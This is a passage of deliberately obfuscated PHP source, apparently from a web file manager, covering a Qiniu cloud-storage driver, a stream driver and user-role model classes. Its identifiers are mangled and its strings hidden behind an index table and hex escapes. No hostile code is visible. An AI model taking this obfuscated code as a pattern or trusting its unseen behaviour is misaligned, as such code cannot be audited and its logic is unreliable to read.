{ if (stripos($ÛºÏ¢Ô÷, $•µşè×ø[1510])) { $èÖ‹¹êÔ = 2; $æ¯šĞ±¿ = explode($•µşè×ø[1510], $ÛºÏ¢Ô÷); $æ¯šĞ±¿ = explode($•µşè×ø[4], $æ¯šĞ±¿[0]); $ÛºÏ¢Ô÷ = !empty($æ¯šĞ±¿[1]) ? $æ¯šĞ±¿[1] : $ÛºÏ¢Ô÷; } } if ($äæÓÍ‘Æ && I18n::getType() == $•µşè×ø[1511]) { if ($èÖ‹¹êÔ == 1) { $ÛºÏ¢Ô÷ = str_replace($•µşè×ø[1512], $•µşè×ø[1513], $ÛºÏ¢Ô÷); } else { if ($èÖ‹¹êÔ == 2) { $æ¯šĞ±¿ = explode($•µşè×ø[214], $æ¯šĞ±¿[0]); $”¦è”òŒ = isset($æ¯šĞ±¿[1]) ? $æ¯šĞ±¿[1] : $•µşè×ø[12]; $ÙÑÄ…ãí = array($•µşè×ø[1514] => $•µşè×ø[1515], $•µşè×ø[1516] => $•µşè×ø[1517], $•µşè×ø[1518] => $•µşè×ø[1519], $•µşè×ø[1520] => $•µşè×ø[1521], $•µşè×ø[1522] => $•µşè×ø[1523], $•µşè×ø[1524] => $•µşè×ø[1525], $•µşè×ø[1526] => $•µşè×ø[1527], $•µşè×ø[1528] => $•µşè×ø[1529], $•µşè×ø[1530] => $•µşè×ø[1531], $•µşè×ø[1532] => $•µşè×ø[1533]); if (isset($ÙÑÄ…ãí[$”¦è”òŒ])) { $ÛºÏ¢Ô÷ = $ÙÑÄ…ãí[$”¦è”òŒ]; } } } if (stripos($ÛºÏ¢Ô÷, $•µşè×ø[1534])) { $ÛºÏ¢Ô÷ = $•µşè×ø[1535]; } } if (!trim($ÛºÏ¢Ô÷)) { return; } parent::writeLog(trim($ÛºÏ¢Ô÷), $ëíÊå); } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($äÖ•¼¤) { parent::__construct(); require_once SDK_DIR . $_SERVER[§Êá¸İ][1536]; $this->_init($äÖ•¼¤); } public function _init($š”ÛÁŸ©) { $Ã»Ú«–é =& $_SERVER[§Êá¸İ]; $this->config = $š”ÛÁŸ©; foreach ($š”ÛÁŸ© as $ŠÅê©½Õ => $…ô€ö¸Á) { if (isset($this->{$ŠÅê©½Õ})) { $this->{$ŠÅê©½Õ} = $…ô€ö¸Á; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($Ã»Ú«–é[1537] . LNG($Ã»Ú«–é[1472])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($âè†®Ç¤, $õäßâÀê = '', $ÕÒ®À— = REPEAT_RENAME) { if ($this->setContent($âè†®Ç¤, $õäßâÀê)) { return $this->getPathOuter($âè†®Ç¤); } return !1; } public function mkdir($®¥ÉÎå», $ŠıÚïíª = REPEAT_SKIP) { $“—ªí¢ =& $_SERVER[§Êá¸İ]; $èì­¨Ï = trim($®¥ÉÎå», $“—ªí¢[8]); if ($this->_isFolder($èì­¨Ï)) { return $this->getPathOuter($èì­¨Ï); } $®¥ÉÎå» = $èì­¨Ï . $“—ªí¢[8]; $ŒÓ÷¥ = get_path_this($èì­¨Ï); $—ªù×‹½ = $®¥ÉÎå» . $ŒÓ÷¥; if (!$this->mkfile($—ªù×‹½)) { return !1; } if (!$this->moveFile($—ªù×‹½, $®¥ÉÎå»)) { $this->delFile($—ªù×‹½); return !1; } return $this->getPathOuter($èì­¨Ï); } public function copyFile($¶ºê‰Åç, $‰öÃ¢‹¦) { $€ö‰ç¼Œ = $this->bucketManager->copy($this->bucket, $¶ºê‰Åç, $this->bucket, $‰öÃ¢‹¦, !0); return $€ö‰ç¼Œ ? !1 : $this->getPathOuter($‰öÃ¢‹¦); } public function moveFile($÷¶¬óç”, $¾×Óºç†) { $Ñƒ–¸ëÇ = $this->bucketManager->move($this->bucket, $÷¶¬óç”, $this->bucket, $¾×Óºç†, !0); return $Ñƒ–¸ëÇ ? !1 : $this->getPathOuter($¾×Óºç†); } public function delFile($¼“œèŒ¿) { if (!$this->exist($¼“œèŒ¿)) { return !0; } $íæĞÍÛ• = $this->bucketManager->delete($this->bucket, $¼“œèŒ¿); return $íæĞÍÛ• ? !1 : !0; } public function delFolder($¼ßö·í) { $¾±¥š Š =& $_SERVER[§Êá¸İ]; if (!$this->exist($¼ßö·í)) { return !0; } $this->listItemCache = !1; $š£¯´Ñ¡ = $this->fileList($¼ßö·í); $this->listItemCache = !0; $Ú‘ŞêÇÆ = trim($¼ßö·í, $¾±¥š Š[8]) . $¾±¥š Š[8]; if (!empty($¼ßö·í) && $¼ßö·í !== $¾±¥š Š[228] && !in_array($Ú‘ŞêÇÆ, $š£¯´Ñ¡[$¾±¥š Š[85]])) { $š£¯´Ñ¡[$¾±¥š Š[85]][] = $Ú‘ŞêÇÆ; } $’È‰šñ = $this->delByBatch($š£¯´Ñ¡[$¾±¥š Š[86]]); if (!$’È‰šñ) { return !1; } $’È‰šñ = $this->delByBatch($š£¯´Ñ¡[$¾±¥š Š[85]]); if (!$’È‰šñ) { return !1; } return $this->delFile($Ú‘ŞêÇÆ); } private function delByBatch($Ô„Ù­¢) { foreach (array_chunk($Ô„Ù­¢, 1000) as $¡ÙŸïïí) { $ù±Ãş½ = $this->bucketManager->buildBatchDelete($this->bucket, $¡ÙŸïïí); list($Ü†ò¥»Ù, $ÜÒÌµÃ­) = $this->bucketManager->batch($ù±Ãş½); if ($ÜÒÌµÃ­) { return !1; } } return !0; } public function rename($«¨ã”ÚŞ, $êêû¡) { return $this->renameObject($«¨ã”ÚŞ, $êêû¡); } public function fileInfo($õ¸Ë“”‡, $¤µÃáÅå = false, $ÁÔ±Õ‹ = array()) { $Ñ–—ôË• =& $_SERVER[§Êá¸İ]; $µÃòş¬ = array($Ñ–—ôË•[32] => $this->pathThis($õ¸Ë“”‡), $Ñ–—ôË•[87] => $this->getPathOuter($Ñ–—ôË•[8] . $õ¸Ë“”‡), $Ñ–—ôË•[33] => $Ñ–—ôË•[230], $Ñ–—ôË•[79] => isset($ÁÔ±Õ‹[$Ñ–—ôË•[1538]]) ? $ÁÔ±Õ‹[$Ñ–—ôË•[1538]] : 0, $Ñ–—ôË•[169] => $this->ext($õ¸Ë“”‡)); if ($¤µÃáÅå) { return $µÃòş¬; } $µÃòş¬[$Ñ–—ôË•[231]] = $µÃòş¬[$Ñ–—ôË•[88]] = 0; $µÃòş¬[$Ñ–—ôË•[232]] = $µÃòş¬[$Ñ–—ôË•[233]] = !0; if (empty($ÁÔ±Õ‹)) { $ÁÔ±Õ‹ = $this->objectMeta($õ¸Ë“”‡); if (!$ÁÔ±Õ‹) { return $µÃòş¬; } } if (isset($ÁÔ±Õ‹[$Ñ–—ôË•[234]]) && $ÁÔ±Õ‹[$Ñ–—ôË•[234]]) { $µÃòş¬[$Ñ–—ôË•[235]] = $ÁÔ±Õ‹[$Ñ–—ôË•[234]]; } if (isset($ÁÔ±Õ‹[$Ñ–—ôË•[245]]) && $ÁÔ±Õ‹[$Ñ–—ôË•[245]]) { $µÃòş¬[$Ñ–—ôË•[235]] = $ÁÔ±Õ‹[$Ñ–—ôË•[245]]; } if (isset($ÁÔ±Õ‹[$Ñ–—ôË•[1539]])) { $µÃòş¬[$Ñ–—ôË•[88]] = substr($ÁÔ±Õ‹[$Ñ–—ôË•[1539]] . $Ñ–—ôË•[12], 0, 10); } if (isset($ÁÔ±Õ‹[$Ñ–—ôË•[1538]])) { $µÃòş¬[$Ñ–—ôË•[79]] = $ÁÔ±Õ‹[$Ñ–—ôË•[1538]]; } return $µÃòş¬; } public function folderInfo($… ¯¯, $¢‘ø³îÊ = false) { $úºàëÁš =& $_SERVER[§Êá¸İ]; $­äÁ¢Ñ“ = array($úºàëÁš[32] => $this->pathThis($… ¯¯), $úºàëÁš[87] => $this->getPathOuter($úºàëÁš[8] . $… ¯¯), $úºàëÁš[33] => $úºàëÁš[78]); if ($¢‘ø³îÊ) { return $­äÁ¢Ñ“; } $­äÁ¢Ñ“[$úºàëÁš[231]] = $­äÁ¢Ñ“[$úºàëÁš[88]] = 0; $­äÁ¢Ñ“[$úºàëÁš[232]] = $­äÁ¢Ñ“[$úºàëÁš[233]] = !0; $… ¯¯ = rtrim($… ¯¯, $úºàëÁš[8]) . $úºàëÁš[8]; $°Äòµ¼» = $this->objectMeta($… ¯¯); if (isset($°Äòµ¼»[$úºàëÁš[1539]])) { $­äÁ¢Ñ“[$úºàëÁš[88]] = substr($°Äòµ¼»[$úºàëÁš[1539]] . $úºàëÁš[12], 0, 10); } return $­äÁ¢Ñ“; } public function listPath($º¶®“ææ, $ä€øå“ = false) { $š¹ßš¾ =& $_SERVER[§Êá¸İ]; $”É¶îÖû = $this->fileList($º¶®“ææ, $š¹ßš¾[8], !0); foreach ($”É¶îÖû[$š¹ßš¾[85]] as $Ù€ãÓ©Ô => $èƒ™…Û­) { $”É¶îÖû[$š¹ßš¾[85]][$Ù€ãÓ©Ô] = $this->folderInfo($èƒ™…Û­, $ä€øå“); } foreach ($”É¶îÖû[$š¹ßš¾[86]] as $Ù€ãÓ©Ô => $èƒ™…Û­) { $”É¶îÖû[$š¹ßš¾[86]][$Ù€ãÓ©Ô] = $this->fileInfo($èƒ™…Û­[$š¹ßš¾[97]], $ä€øå“, $èƒ™…Û­); } return $”É¶îÖû; } public function has($‰ŠÎ²—, $½£À ç = false, $×©İ‚ãÍ = true) { $€³¹ƒ¹ö =& $_SERVER[§Êá¸İ]; $‰ŠÎ²— = trim($‰ŠÎ²—, $€³¹ƒ¹ö[8]); $âûÆÉ Ğ = empty($‰ŠÎ²—) && $‰ŠÎ²— !== $€³¹ƒ¹ö[228] ? $€³¹ƒ¹ö[12] : $‰ŠÎ²— . $€³¹ƒ¹ö[8]; $°Óñ ˆ¸ = $€³¹ƒ¹ö[12]; $Üøâ…ÙÀ = 500; $ôëÈ±Ùæ = $€³¹ƒ¹ö[8]; $¿“ŠÁ«´ = $ñ÷¼ŒŠ = 0; while (!0) { check_abort(); list($Îù“©—Ÿ, $óÔæ½àª) = $this->bucketManager->listFiles($this->bucket, $âûÆÉ Ğ, $°Óñ ˆ¸, $Üøâ…ÙÀ, $ôëÈ±Ùæ); if ($óÔæ½àª) { break; } $°Óñ ˆ¸ = array_key_exists($€³¹ƒ¹ö[1484], $Îù“©—Ÿ) ? $°Óñ ˆ¸ = $Îù“©—Ÿ[$€³¹ƒ¹ö[1540]] : $€³¹ƒ¹ö[12]; if ($½£À ç) { if (!empty($Îù“©—Ÿ[$€³¹ƒ¹ö[1541]])) { $¿“ŠÁ«´ += count($Îù“©—Ÿ[$€³¹ƒ¹ö[1541]]); } if (!empty($Îù“©—Ÿ[$€³¹ƒ¹ö[1542]])) { $ñ÷¼ŒŠ += count($Îù“©—Ÿ[$€³¹ƒ¹ö[1542]]); } if ($°Óñ ˆ¸ === $€³¹ƒ¹ö[12]) { break; } continue; } if ($×©İ‚ãÍ) { if (!empty($Îù“©—Ÿ[$€³¹ƒ¹ö[1541]])) { return !0; } } else { if (!empty($Îù“©—Ÿ[$€³¹ƒ¹ö[1542]])) { return !0; } } if ($°Óñ ˆ¸ === $€³¹ƒ¹ö[12]) { break; } } if ($½£À ç) { return array($€³¹ƒ¹ö[239] => $¿“ŠÁ«´, $€³¹ƒ¹ö[240] => $ñ÷¼ŒŠ); } return !1; } public function listAll($Æø‰±°â) { $¼¾ê™À³ =& $_SERVER[§Êá¸İ]; $½“À¥«Õ = $this->fileList($Æø‰±°â, $¼¾ê™À³[12], !0); $šÁŞÉÃÕ = array_to_keyvalue($½“À¥«Õ[$¼¾ê™À³[86]], $¼¾ê™À³[32]); foreach ($½“À¥«Õ[$¼¾ê™À³[85]] as $Å¬ÂÉ§—) { if (is_string($Å¬ÂÉ§—)) { $šÁŞÉÃÕ[$Å¬ÂÉ§—] = array($¼¾ê™À³[79] => 0); } } return $this->listAllFiles($Æø‰±°â, $šÁŞÉÃÕ); } private function fileList($›Ã€€µº, $‡Õèë€  = '', $„ÈÖÔõ× = 0) { $Ù¶ØÛàë =& $_SERVER[§Êá¸İ]; $›Ã€€µº = trim($›Ã€€µº, $Ù¶ØÛàë[8]); $ÉŠ«ô© = empty($›Ã€€µº) && $›Ã€€µº !== $Ù¶ØÛàë[228] ? $Ù¶ØÛàë[12] : $›Ã€€µº . $Ù¶ØÛàë[8]; $ßßØò°˜ = $Ù¶ØÛàë[12]; $îıâÓ‰Î = 1000; $û‘™– = $€–éÚÇ„ = array(); while (!0) { check_abort(); list($ÉìŒŸÁ‹, $É¨©¨Ò´) = $this->bucketManager->listFiles($this->bucket, $ÉŠ«ô©, $ßßØò°˜, $îıâÓ‰Î, $‡Õèë€ ); if ($É¨©¨Ò´) { break; } $ßßØò°˜ = array_key_exists($Ù¶ØÛàë[1484], $ÉìŒŸÁ‹) ? $ßßØò°˜ = $ÉìŒŸÁ‹[$Ù¶ØÛàë[1540]] : $Ù¶ØÛàë[12]; $ìâó“ù = isset($ÉìŒŸÁ‹[$Ù¶ØÛàë[1541]]) ? $ÉìŒŸÁ‹[$Ù¶ØÛàë[1541]] : array(); $¢ŒÙø´å = isset($ÉìŒŸÁ‹[$Ù¶ØÛàë[1542]]) ? $ÉìŒŸÁ‹[$Ù¶ØÛàë[1542]] : array(); foreach ($ìâó“ù as $¢›ØŒ‘Ê) { if ($¢›ØŒ‘Ê[$Ù¶ØÛàë[97]] == $ÉŠ«ô©) { continue; } $¥çĞí´´ = $¢›ØŒ‘Ê[$Ù¶ØÛàë[97]]; $½ã’£„ = $¢›ØŒ‘Ê[$Ù¶ØÛàë[1538]]; $¢›ØŒ‘Ê[$Ù¶ØÛàë[79]] = $½ã’£„; $Æ£×œ— = $½ã’£„ == 0 && substr($¥çĞí´´, strlen($¥çĞí´´) - 1, 1) == $Ù¶ØÛàë[8] ? !0 : !1; $this->cacheMethodInfoSet($¥çĞí´´, $Æ£×œ—, $¢›ØŒ‘Ê); if ($Æ£×œ—) { $û‘™–[] = $¥çĞí´´; continue; } $€–éÚÇ„[] = $„ÈÖÔõ× ? $¢›ØŒ‘Ê : $¥çĞí´´; } foreach ($¢ŒÙø´å as $¥çĞí´´) { if ($¥çĞí´´ == $ÉŠ«ô©) { continue; } $û‘™–[] = $¥çĞí´´; $this->cacheMethodInfoSet($¥çĞí´´, !0); } if ($ßßØò°˜ === $Ù¶ØÛàë[12]) { break; } } $this->cacheMethodInfoSet($›Ã€€µº, !0); return array($Ù¶ØÛàë[85] => $û‘™–, $Ù¶ØÛàë[86] => $€–éÚÇ„); } public function canRead($‚İ«“Ë›) { return $this->exist($‚İ«“Ë›) ? !0 : !1; } public function canWrite($¬©Ô·£) { return $this->exist($¬©Ô·£) ? !0 : !1; } public function getContent($Ã½ß‰¢Û) { return $this->fileSubstr($Ã½ß‰¢Û, 0, -1); } public function setContent($Öú±…Êğ, $‚ËÕôÇá = '') { $¶±¿áÙ² = $this->tempFile($this->pathThis($Öú±…Êğ)); file_put_contents($¶±¿áÙ², $‚ËÕôÇá); if ($this->upload($Öú±…Êğ, $¶±¿áÙ²)) { $this->tempFileRemve($¶±¿áÙ²); return !0; } return !1; } public function refreshUrls($±ı…å¤) { $×õ¶’üõ =& $_SERVER[§Êá¸İ]; $é±ôã³ = array(); if (is_array($±ı…å¤)) { foreach ($±ı…å¤ as $¯½ƒúÍÈ) { $é±ôã³[] = $this->link($¯½ƒúÍÈ); } } else { $é±ôã³[] = $this->link($±ı…å¤); } $„Ó¨İ = new Qiniu\Cdn\CdnManager($this->auth); list($áÁ¼¾éÏ, $‹†Îä—¢) = $„Ó¨İ->refreshUrls($é±ôã³); if ($‹†Îä—¢) { return !1; } return $áÁ¼¾éÏ[$×õ¶’üõ[1274]] == $×õ¶’üõ[846] ? !0 : !1; } public function fileSubstr($æåç ñ®, $¿ÜÖ™Í¢, $œÜî¢°‹) { $µ¨Øèº =& $_SERVER[§Êá¸İ]; if (!($Ãİı‘È = $this->link($æåç ñ®))) { return !1; } $ÜêÏ¹Ÿñ = !1; if ($œÜî¢°‹ > 0) { $õÙ¿Ş¸ = $¿ÜÖ™Í¢ + $œÜî¢°‹ - 1; $ÜêÏ¹Ÿñ = array($µ¨Øèº[1543] . $¿ÜÖ™Í¢ . $µ¨Øèº[462] . $õÙ¿Ş¸); } $øßãÛÏ… = url_request($Ãİı‘È, $µ¨Øèº[261], !1, $ÜêÏ¹Ÿñ); return $øßãÛÏ…[$µ¨Øèº[837]] ? $øßãÛÏ…[$µ¨Øèº[1297]] : !1; } public function upload($£ÂœÙ°, $®áá‚’Ì, $Ù®ÉÖ¾— = false, $³‡Æäâ› = REPEAT_REPLACE) { $‚úÊÈèÈ = new Qiniu\Storage\UploadManager(); $°İ‰û¼ = $this->auth->uploadToken($this->bucket, $£ÂœÙ°); $¯¯İË– = get_file_mime(get_path_ext($®áá‚’Ì)); list($¥¿ßüÅ, $‹Ê˜½ˆã) = $‚úÊÈèÈ->putFile($°İ‰û¼, $£ÂœÙ°, $®áá‚’Ì, null, $¯¯İË–); return $‹Ê˜½ˆã ? !1 : $this->getPathOuter($£ÂœÙ°); } public function uploadFormData($„ïèÓÃÜ, $£éÚŒŠë = 3600) { return $this->uploadToken($„ïèÓÃÜ, $£éÚŒŠë); } public function multiUploadFormData($ªÏÈŒÎş, $­ôØùÃª = 3600) { return $this->uploadToken($ªÏÈŒÎş, $­ôØùÃª); } private function uploadToken($Èüè»ç•, $ï×ìøä = 3600) { $’®¾Ÿ =& $_SERVER[§Êá¸İ]; $ßË›ïÍÊ = $ï×ìøä; $­–íã»œ = array($’®¾Ÿ[1544] => $’®¾Ÿ[1545]); $‰ï„Õëã = $Èüè»ç•; $˜ã¡Äì¹ = $this->auth->uploadToken($this->bucket, $‰ï„Õëã, $ßË›ïÍÊ, $­–íã»œ, !0); $­†¹×¾ = empty($this->region) || $this->region == $’®¾Ÿ[1546] ? $’®¾Ÿ[12] : $’®¾Ÿ[462] . $this->region; $ã¤—şø = http_type() . "\x3a\57\57\x75\x70\154\x6f\x61\x64{$­†¹×¾}\56\x71\x69\x6e\151\165\160\x2e\x63\x6f\155\x2f"; return array($’®¾Ÿ[1547] => $˜ã¡Äì¹, $’®¾Ÿ[1548] => $ã¤—şø); } public function download($¶€—İ½‘, $¿òí¥î) { $ñÑŞ©š» = IO::getPathInner(IO::mkfile($¿òí¥î)); if (!($®­Úûİ¯ = $this->link($¶€—İ½‘))) { return !1; } $ÊÉÄƒŒË = 0; $€¡÷áœ‘ = 1024 * 200; $«ìÁ­ƒ¢ = fopen($ñÑŞ©š», $_SERVER[§Êá¸İ][1549]); while (!0) { $Ô’Ü‹œ = $this->fileSubstr($¶€—İ½‘, $ÊÉÄƒŒË, $€¡÷áœ‘); if ($Ô’Ü‹œ === !1) { return !1; } fwrite($«ìÁ­ƒ¢, $Ô’Ü‹œ); $ÊÉÄƒŒË += $€¡÷áœ‘; if (strlen($Ô’Ü‹œ) < $€¡÷áœ‘) { break; } } fclose($«ìÁ­ƒ¢); return $¿òí¥î; } public function link($ƒşß, $‡îıÛæó = '') { if (!$this->isFile($ƒşß)) { return !1; } $”ÜÚ­¸Ä = $this->getHost() . $_SERVER[§Êá¸İ][8] . $this->pathEncode($ƒşß) . $‡îıÛæó; return $this->auth->privateDownloadUrl($”ÜÚ­¸Ä, 3600 * 12); } public function fileOut($ş³¶ïËç, $–Æå‘ª¶ = false, $ìÊ†”á„ = false, $ƒ‡ÊÂÛ = '') { $¹½‹ˆÒï =& $_SERVER[§Êá¸İ]; if ($this->isFileOutServer()) { return $this->fileOutServer($ş³¶ïËç, $–Æå‘ª¶, $ìÊ†”á„, $ƒ‡ÊÂÛ); } if (!$ìÊ†”á„) { $ìÊ†”á„ = $this->pathThis($ş³¶ïËç); } $‡ºËÀù = $–Æå‘ª¶ ? $¹½‹ˆÒï[1550] . rawurlencode($ìÊ†”á„) : $¹½‹ˆÒï[12]; $í®Âü¹÷ = $this->link($ş³¶ïËç, $‡ºËÀù); $this->fileOutLink($í®Âü¹÷); } public function fileOutServer($·¤‡‘Ç×, $ı”Ùı’ = false, $×¿±Û€Ô = false, $¢£ÙêíÖ = '') { parent::fileOut($·¤‡‘Ç×, $ı”Ùı’, $×¿±Û€Ô, $¢£ÙêíÖ); } public function fileOutImage($ñó‡Ï›, $—³ŞçíŞ = 250) { if ($this->size($ñó‡Ï›) > 1024 * 1024 * 20) { return $this->fileOutImageServer($ñó‡Ï›, $—³ŞçíŞ); } $÷§•ÑÁ‡ = $this->link($ñó‡Ï›, $_SERVER[§Êá¸İ][1551] . $—³ŞçíŞ); $this->fileOutLink($÷§•ÑÁ‡); } public function fileOutImageServer($Ş‹¬³ĞÎ, $Öø‡¶·Ü = 250) { parent::fileOutImage($Ş‹¬³ĞÎ, $Öø‡¶·Ü); } public function hashMd5($ËÚ«É¿¬) { $ùØÜÇÔ¼ =& $_SERVER[§Êá¸İ]; $¿Ş³’¦Å = $this->objectMeta($ËÚ«É¿¬); return isset($¿Ş³’¦Å[$ùØÜÇÔ¼[245]]) ? $¿Ş³’¦Å[$ùØÜÇÔ¼[245]] : !1; $¶˜·±ïÊ = $this->link($ËÚ«É¿¬, $ùØÜÇÔ¼[1552]); } public function size($˜úÜ«ú) { $ë˜áóšŒ = $this->objectMeta($˜úÜ«ú); return $ë˜áóšŒ ? $ë˜áóšŒ[$_SERVER[§Êá¸İ][79]] : 0; } public function info($äİ†˜®¬) { if ($this->isFolder($äİ†˜®¬)) { return $this->folderInfo($äİ†˜®¬); } else { if ($this->isFile($äİ†˜®¬)) { return $this->fileInfo($äİ†˜®¬); } } return !1; } public function exist($ãûİ›Äû) { return $this->isFile($ãûİ›Äû) || $this->isFolder($ãûİ›Äû); } public function isFile($¥¿ã‰¦£) { return !$this->isFolder($¥¿ã‰¦£) && $this->objectMeta($¥¿ã‰¦£); } public function isFolder($Á‚»÷«ë) { return $this->cacheMethod($_SERVER[§Êá¸İ][179], $Á‚»÷«ë); } protected function objectMeta($Û˜¾Ş¸â) { return $this->cacheMethod($_SERVER[§Êá¸İ][181], $Û˜¾Ş¸â); } protected function _objectMeta($üÕ––ÏÕ) { $Å«âÇã‰ =& $_SERVER[§Êá¸İ]; list($º³å•†¢, $ŸèäÇ´Â) = $this->bucketManager->stat($this->bucket, $üÕ––ÏÕ); if ($º³å•†¢) { $º³å•†¢[$Å«âÇã‰[79]] = intval($º³å•†¢[$Å«âÇã‰[1538]]); } return $º³å•†¢; } protected function _isFolder($ºÓ¿Œáé) { $»èô‘ú =& $_SERVER[§Êá¸İ]; if ($ºÓ¿Œáé == $»èô‘ú[12] || $ºÓ¿Œáé == $»èô‘ú[8]) { return !0; } list($ø©×µÉ¦, $„¦¹ª) = $this->bucketManager->listFiles($this->bucket, trim($ºÓ¿Œáé, $»èô‘ú[8]) . $»èô‘ú[8], $»èô‘ú[12], 1, $»èô‘ú[8]); return !empty($ø©×µÉ¦[$»èô‘ú[1541]]) || !empty($ø©×µÉ¦[$»èô‘ú[1542]]) ? !0 : !1; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($ÓõÛŞĞ, $¦ÙÃ„íÅ = 0) { parent::__construct(); $this->source = $ÓõÛŞĞ; $this->sourceSize = $¦ÙÃ„íÅ; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($‘‡É¯Ä  = false) { return $this->sourceSize; } public function getContent($Ÿ©ÖåÛî = false) { return $this->fileSubstr($Ÿ©ÖåÛî, 0, $this->sourceSize); } public function fileSubstr($ŞÃºœİÏ = false, $¼–é¢Ó˜ = 0, $äõ·©Ò¦ = 0) { if (!$äõ·©Ò¦) { $äõ·©Ò¦ = $this->sourceSize; } $ñÖ¨òÙ = $this->sourceSize - $¼–é¢Ó˜; if ($äõ·©Ò¦ >= $ñÖ¨òÙ) { $äõ·©Ò¦ = $ñÖ¨òÙ; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $¼–é¢Ó˜, $äõ·©Ò¦); } if ($this->sourceType == self::TYPE_FILE) { if ($äõ·©Ò¦ <= 0) { return $_SERVER[§Êá¸İ][12]; } $Éä€º²Û = ftell($this->source); fseek_64($this->source, $Éä€º²Û + $¼–é¢Ó˜); $Ğ´åµŒÁ = @fread($this->source, $äõ·©Ò¦); fseek_64($this->source, $Éä€º²Û); return $Ğ´åµŒÁ; } } public function hashMd5($ûìŸ§Êî = false) { return md5($this->getContent()); } public static function hash($½¥ìÇŒ­, $å–ö¡è = 0) { $©­ÑÖ¸ı = new PathDriverStream($½¥ìÇŒ­, $å–ö¡è); return $©­ÑÖ¸ı->hashSimple($½¥ìÇŒ­); } public static function md5($­êË¬™”, $ÏÖ’—… = 0) { $ïïšŞ°Õ = new PathDriverStream($­êË¬™”, $ÏÖ’—…); return $ïïšŞ°Õ->hashMd5($­êË¬™”); } } goto BŠÏÀŒÉåÈ; dĞ®ßê‘: class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\x65\x6d\x2e\162\157\x6c\x65\114\x69\163\x74"; public $field = array("\156\x61\x6d\x65", "\x61\165\x74\150", "\154\x61\142\145\x6c", "\x64\151\x73\160\154\141\x79", "\x73\171\163\164\x65\x6d", "\x64\x65\x73\x63", "\151\x67\x6e\157\x72\x65\105\x78\164", "\151\x67\156\157\x72\x65\106\x69\x6c\x65\x53\x69\x7a\145", "\141\x64\x6d\x69\x6e\151\163\x74\x72\x61\x74\x6f\162", "\163\x6f\162\164"); public function listData($Äå±‚éŠ = false, $ıºÄ„† = "\x73\x6f\x72\164", $ââÒÅÛ´ = false) { $ßô²å»» =& $_SERVER[§Êá¸İ]; $ø¦å÷½ = parent::listData($Äå±‚éŠ, $ıºÄ„†, $ââÒÅÛ´); if (!$Äå±‚éŠ) { foreach ($ø¦å÷½ as $¤ê¹ßÏ => $• ¦©ã”) { if ($• ¦©ã”[$ßô²å»»[2185]] == 1) { $ø¦å÷½[$¤ê¹ßÏ][$ßô²å»»[534]] = LNG($ßô²å»»[2446]); } } } return $ø¦å÷½; } public function update($¡á±Ğ, $ãÀçî¹) { $´½Ìšü× =& $_SERVER[§Êá¸İ]; $Ïßßù¿Ş = parent::listData($¡á±Ğ); $ú°°©Ò = $this->findByName($ãÀçî¹[$´½Ìšü×[32]]); if (!$Ïßßù¿Ş || $ú°°©Ò && $ú°°©Ò[$´½Ìšü×[483]] != $Ïßßù¿Ş[$´½Ìšü×[483]]) { return !1; } if ($ú°°©Ò[$´½Ìšü×[2185]] == 1) { $ãÀçî¹ = array($´½Ìšü×[32] => $ãÀçî¹[$´½Ìšü×[32]], $´½Ìšü×[2001] => $ãÀçî¹[$´½Ìšü×[2001]]); } $this->filterAuth($ãÀçî¹[$´½Ìšü×[495]]); return parent::update($¡á±Ğ, $ãÀçî¹); } public function remove($Ëï—Õ©) { $ïşû—´õ = parent::listData($Ëï—Õ©); if (!$ïşû—´õ || $ïşû—´õ[$_SERVER[§Êá¸İ][191]]) { return !1; } return parent::remove($Ëï—Õ©); } public function add($ùÎÎÚ‘²) { $´´Å™‡ï =& $_SERVER[§Êá¸İ]; $ïåñğ†Ä = $ùÎÎÚ‘²[$´´Å™‡ï[32]]; if ($this->findByName($ïåñğ†Ä)) { return !1; } $À¨ğ‰ÄÃ = array($´´Å™‡ï[502] => $ïåñğ†Ä, $´´Å™‡ï[1984] => $´´Å™‡ï[12], $´´Å™‡ï[1980] => $´´Å™‡ï[1988], $´´Å™‡ï[2447] => 1, $´´Å™‡ï[1983] => 0, $´´Å™‡ï[2448] => 0, $´´Å™‡ï[1982] => $this->getSort()); $ùÎÎÚ‘² = array_merge($À¨ğ‰ÄÃ, $ùÎÎÚ‘²); $this->filterAuth($ùÎÎÚ‘²[$´´Å™‡ï[495]]); return parent::insert($ùÎÎÚ‘²); } private function getSort() { $Èä´ÃŠ¾ =& $_SERVER[§Êá¸İ]; $ş¬‹”Ãø = parent::listData(); $ÚğøµŠ = array_to_keyvalue($ş¬‹”Ãø, $Èä´ÃŠ¾[12], $Èä´ÃŠ¾[2002]); return empty($ÚğøµŠ) ? 0 : max($ÚğøµŠ) + 1; } private function filterAuth(&$»Ì´ƒ¡) { $øêŞê¤ =& $_SERVER[§Êá¸İ]; $éšÙî°ó = array(); $ÜÌôĞ Ì = array_filter(explode($øêŞê¤[50], $»Ì´ƒ¡)); foreach ($ÜÌôĞ Ì as $»Ì´ƒ¡) { $ÉÔ˜‰’Ğ = explode($øêŞê¤[10], $»Ì´ƒ¡); if ($ÉÔ˜‰’Ğ[0] == $øêŞê¤[2449] && $ÉÔ˜‰’Ğ[1] != $øêŞê¤[1285]) { $Ğ›‘Ó“ó = $ÉÔ˜‰’Ğ[0] . $øêŞê¤[10] . $ÉÔ˜‰’Ğ[1] . $øêŞê¤[2450]; if (!in_array($Ğ›‘Ó“ó, $ÜÌôĞ Ì)) { $éšÙî°ó[] = $Ğ›‘Ó“ó; } } $éšÙî°ó[] = $»Ì´ƒ¡; } $»Ì´ƒ¡ = implode($øêŞê¤[50], $éšÙî°ó); } public function findRoleDefault() { 